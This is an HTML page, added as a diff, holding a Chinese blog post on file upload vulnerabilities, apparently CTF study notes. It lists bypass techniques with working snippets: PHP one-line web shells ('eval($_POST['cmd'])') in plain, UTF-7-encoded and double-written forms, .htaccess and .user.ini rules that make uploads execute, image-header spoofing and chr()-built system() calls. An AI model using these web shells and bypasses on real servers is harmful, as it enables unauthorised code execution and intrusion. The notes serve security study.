@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="https://yoyo2yong.xyz">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"www.yoyo2tong.xyz","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="文件上传漏洞原因一些web应用程序中允许上传图片，文本或者其他资源到指定的位置，文件上传漏洞就是利用这些可以上传的地方将恶意代码植入到服务器中，再通过url去访问以执行代码。 通常造成文件上传漏洞的原因是对于上传文件的后缀名（扩展名），类型，以及内容没有做好严格的限制等等一些原因。 本地文件上传 本地文件上传只有当选择的php版本不带有nts才能成功执行。  当成功执行phpinfo（）后，可以用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传漏洞">
+<meta property="og:url" content="http://www.yoyo2tong.xyz/2020/10/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="yoyo">
+<meta property="og:description" content="文件上传漏洞原因一些web应用程序中允许上传图片，文本或者其他资源到指定的位置，文件上传漏洞就是利用这些可以上传的地方将恶意代码植入到服务器中，再通过url去访问以执行代码。 通常造成文件上传漏洞的原因是对于上传文件的后缀名（扩展名），类型，以及内容没有做好严格的限制等等一些原因。 本地文件上传 本地文件上传只有当选择的php版本不带有nts才能成功执行。  当成功执行phpinfo（）后，可以用">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDCCPDCDFDCCOHAGOGH">
+<meta property="og:image" content="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDDCPDCDFDDCOHAGOGH">
+<meta property="og:image" content="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDFCPDCDFDECOHAGOGH">
+<meta property="og:image" content="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDGCPDCDEDHCOHAGOGH">
+<meta property="og:image" content="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDECPDFDFDFCOHAGOGH">
+<meta property="og:image" content="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDHCPDCDEDICOHAGOGH">
+<meta property="og:image" content="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDHDACPDGDHDGDICOHAGOGH">
+<meta property="og:image" content="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDICPDCDEDJCOHAGOGH">
+<meta property="og:image" content="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDJCPDCDFDACOHAGOGH">
+<meta property="og:image" content="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDHDBCPDCDFDBCOHAGOGH">
+<meta property="article:published_time" content="2020-10-31T07:27:43.834Z">
+<meta property="article:modified_time" content="2020-10-31T07:32:50.307Z">
+<meta property="article:author" content="yoyo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDCCPDCDFDCCOHAGOGH">
+
+<link rel="canonical" href="http://www.yoyo2tong.xyz/2020/10/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>文件上传漏洞 | yoyo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="yoyo" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">yoyo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">请多指教！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.yoyo2tong.xyz/2020/10/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="yoyo">
+      <meta itemprop="description" content="Hello!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yoyo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          文件上传漏洞
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-10-31 15:27:43 / 修改时间：15:32:50" itemprop="dateCreated datePublished" datetime="2020-10-31T15:27:43+08:00">2020-10-31</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="文件上传漏洞原因"><a href="#文件上传漏洞原因" class="headerlink" title="文件上传漏洞原因"></a>文件上传漏洞原因</h3><p>一些web应用程序中允许上传图片，文本或者其他资源到指定的位置，文件上传漏洞就是利用这些可以上传的地方将恶意代码植入到服务器中，再通过url去访问以执行代码。</p>
+<p>通常造成文件上传漏洞的原因是对于上传文件的后缀名（扩展名），类型，以及内容没有做好严格的限制等等一些原因。</p>
+<h4 id="本地文件上传"><a href="#本地文件上传" class="headerlink" title="本地文件上传"></a>本地文件上传</h4><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDCCPDCDFDCCOHAGOGH"></p>
+<p>本地文件上传只有当选择的php版本不带有nts才能成功执行。</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDDCPDCDFDDCOHAGOGH"></p>
+<p>当成功执行phpinfo（）后，可以用蚁剑连接，可获得后台的内容。</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDFCPDCDFDECOHAGOGH"></p>
+<h3 id="文件上传漏洞的绕过方法"><a href="#文件上传漏洞的绕过方法" class="headerlink" title="文件上传漏洞的绕过方法"></a>文件上传漏洞的绕过方法</h3><h4 id="htaccess任意文件执行"><a href="#htaccess任意文件执行" class="headerlink" title="htaccess任意文件执行"></a>htaccess任意文件执行</h4><p>可以将后缀名不是为php的文件改为后缀名为php的文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa   &#x2F;&#x2F;将后缀名为aaa的文件均改为后缀名为php文件</span><br><span class="line">AddType application&#x2F;x-httpd-php .jpg   &#x2F;&#x2F;将后缀名为jpg的文件均改为后缀名为php文件</span><br></pre></td></tr></table></figure>
+
+<p>上传.htaccess文件时候发现文件内容被过滤。可以使用换行绕过的方法绕过过滤。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType appli\</span><br><span class="line">cation&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure>
+
+<p>需要在换行的地方加上一个(反斜杠)</p>
+<h4 id="短标签绕过"><a href="#短标签绕过" class="headerlink" title="短标签绕过"></a>短标签绕过</h4><ul>
+<li>JS风格</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;phpinfo();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>短标签风格</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>&lt;?=?&gt;</code>与<code>&lt;?php echo ....?&gt;</code>等效</li>
+<li>ASP风格</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% phpinfo();%&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>官方默认风格</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="特殊编码绕过"><a href="#特殊编码绕过" class="headerlink" title="特殊编码绕过"></a>特殊编码绕过</h4><p>如果程序过滤了所有标签形式、或者说过滤了<code>&lt;?</code>而且PHP是在PHP7以上版本（PHP7已经将其他标签形式过淘汰，仅剩下<code>&lt;?php</code>形式），这时候我们可以用utf-7编码一句话木马，并通过.htaccess文件解码。</p>
+<p><strong>.htaccess</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br><span class="line">php_flag display_errors on</span><br><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;  &#x2F;&#x2F; 对文件后缀名为aaa的文件内容进行UTF-7解码</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>1.aaa</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+ADw?php +AEA-eval(+ACQAXw-POST+AFs&#39;cmd&#39;+AF0)+ADs?+AD4-</span><br><span class="line">&#x2F;&#x2F; &lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>假如对上传文件的内容中的php，POST，eval替换为空，那么我们可以用这样的方式绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?pphphp</span><br><span class="line">@eevalval($_PPOSTOST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure>
+
+<h4 id="user-ini绕过"><a href="#user-ini绕过" class="headerlink" title=".user.ini绕过"></a>.user.ini绕过</h4><p>.htaccess是伪静态环境配置文件，用于lamp。<br>.user.ini是lnmp文件，里面放的是你网站的文件夹路径地址。目的是防止跨目录访问和文件跨目录读取.<br>配置 放在根目录 .user.ini</p>
+<ul>
+<li>如果上传目录下有一个php文件，可以使用.user.ini将我们制定文件包含到我们目录下的所有PHP文件导致远程代码执行</li>
+<li>.user.ini</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;1.aaa</span><br></pre></td></tr></table></figure>
+
+<p>1.aaa</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">@eval($_POST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure>
+
+<p>在加载其他文件的时候，会先加载.user.ini里面的1.aaa</p>
+<p>当.htaccess被禁止上传时，可以使用.htaccess代替.user.ini</p>
+<h4 id="文件包含解码Base64"><a href="#文件包含解码Base64" class="headerlink" title="文件包含解码Base64"></a>文件包含解码Base64</h4><ul>
+<li>.htaccess</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;shell.aaa&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="图片头绕过"><a href="#图片头绕过" class="headerlink" title="图片头绕过"></a>图片头绕过</h4><p><strong>XMB文件头绕过</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define test_width 16</span><br><span class="line">#define test_height 7</span><br></pre></td></tr></table></figure>
+
+<p>放在php文件的开头，让getimagesize函数误以为上传的是图片文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#define test_width 16</span><br><span class="line">#define test_height 7</span><br><span class="line">&lt;?php</span><br><span class="line">eval($_POST[&#39;cmd&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>GIF89a</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>
+
+<p>也是放在php文件的开头，来绕过getimagesize函数。</p>
+<h4 id="动态拼接函数绕过函数过滤"><a href="#动态拼接函数绕过函数过滤" class="headerlink" title="动态拼接函数绕过函数过滤"></a>动态拼接函数绕过函数过滤</h4><p>当源程序对危险函数进行了过滤，可以使用aiisc码拼接动态构造函数来绕过。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = chr(<span class="number">112</span>).chr(<span class="number">104</span>).chr(<span class="number">112</span>).chr(<span class="number">105</span>).chr(<span class="number">110</span>).chr(<span class="number">102</span>).chr(<span class="number">111</span>);</span><br><span class="line">$a();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用如下代码快速生成指定函数</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($a);$i++)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;chr(&quot;</span>.ord($a[$i]).<span class="string">&quot;).&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>由于php不允许eval动态拼接，所以我们不能拼接一句话木马。</p>
+<p>但我们可以构造system函数来执行系统命令获得flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a&#x3D;chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);</span><br><span class="line">$a(cat&#x2F;flag);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用ctf-wscan查看是否存在备份文件"><a href="#使用ctf-wscan查看是否存在备份文件" class="headerlink" title="使用ctf-wscan查看是否存在备份文件"></a>使用ctf-wscan查看是否存在备份文件</h3><p><strong>ctf-wscan下载地址</strong> </p>
+<p><a target="_blank" rel="noopener" href="https://codeload.github.com/kingkaki/ctf-wscan/zip/master">https://codeload.github.com/kingkaki/ctf-wscan/zip/master</a></p>
+<h4 id="安装python3的环境"><a href="#安装python3的环境" class="headerlink" title="安装python3的环境"></a>安装python3的环境</h4><p>（ctf-wscan只能在python3环境下使用）</p>
+<p><strong>1，下载地址</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.python.org/ftp/python/3.8.3/python-3.8.3-amd64.exe">https://www.python.org/ftp/python/3.8.3/python-3.8.3-amd64.exe</a></p>
+<p><strong>2，安装</strong></p>
+<p>安装之后的界面</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDGCPDCDEDHCOHAGOGH"></p>
+<p>如果安装之后的界面是这样，则没有点击创建文档文件。</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDECPDFDFDFCOHAGOGH"></p>
+<h4 id="下载requests请求插件"><a href="#下载requests请求插件" class="headerlink" title="下载requests请求插件"></a>下载requests请求插件</h4><p>1，下载requests插件需要在python3的Scripts文件下下载</p>
+<p>输入命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install requests</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDHCPDCDEDICOHAGOGH"></p>
+<p>提示命令加上–user 和更新pip</p>
+<p>2，根据提示，输入 python -m pip install –upgrade pip,依然显示错误</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDHDACPDGDHDGDICOHAGOGH"></p>
+<p>3，输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install -upgrade pip -i http:&#x2F;&#x2F;pypi.douban.com&#x2F;simple --user</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDICPDCDEDJCOHAGOGH"></p>
+<p>成功更新。</p>
+<p>4，下载requests插件成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install requests --user</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDJCPDCDFDACOHAGOGH"></p>
+<h4 id="使用ctf-wsacn扫描文件"><a href="#使用ctf-wsacn扫描文件" class="headerlink" title="使用ctf-wsacn扫描文件"></a>使用ctf-wsacn扫描文件</h4><p>输入 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ctf-wscan.py 网址</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDHDBCPDCDFDBCOHAGOGH"></p>
+<p>例，可以看出存在index.php.py备份文件。</p>
+<p>下载备份文件</p>
+<ul>
+<li>把<code>.index.php.swp</code>放到linux下使用vim -r恢复</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -r index.php.swp</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>得到源码</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/10/30/SQL-%E6%B3%A8%E5%85%A5/" rel="prev" title="SQL 注入基础">
+      <i class="fa fa-chevron-left"></i> SQL 注入基础
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8E%9F%E5%9B%A0"><span class="nav-number">1.</span> <span class="nav-text">文件上传漏洞原因</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">1.1.</span> <span class="nav-text">本地文件上传</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-number">2.</span> <span class="nav-text">文件上传漏洞的绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#htaccess%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C"><span class="nav-number">2.1.</span> <span class="nav-text">htaccess任意文件执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%AD%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87"><span class="nav-number">2.2.</span> <span class="nav-text">短标签绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.</span> <span class="nav-text">特殊编码绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="nav-number">2.4.</span> <span class="nav-text">双写绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#user-ini%E7%BB%95%E8%BF%87"><span class="nav-number">2.5.</span> <span class="nav-text">.user.ini绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%A7%A3%E7%A0%81Base64"><span class="nav-number">2.6.</span> <span class="nav-text">文件包含解码Base64</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9B%BE%E7%89%87%E5%A4%B4%E7%BB%95%E8%BF%87"><span class="nav-number">2.7.</span> <span class="nav-text">图片头绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E6%8B%BC%E6%8E%A5%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4"><span class="nav-number">2.8.</span> <span class="nav-text">动态拼接函数绕过函数过滤</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8ctf-wscan%E6%9F%A5%E7%9C%8B%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6"><span class="nav-number">3.</span> <span class="nav-text">使用ctf-wscan查看是否存在备份文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%89%E8%A3%85python3%E7%9A%84%E7%8E%AF%E5%A2%83"><span class="nav-number">3.1.</span> <span class="nav-text">安装python3的环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BDrequests%E8%AF%B7%E6%B1%82%E6%8F%92%E4%BB%B6"><span class="nav-number">3.2.</span> <span class="nav-text">下载requests请求插件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8ctf-wsacn%E6%89%AB%E6%8F%8F%E6%96%87%E4%BB%B6"><span class="nav-number">3.3.</span> <span class="nav-text">使用ctf-wsacn扫描文件</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yoyo"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">yoyo</p>
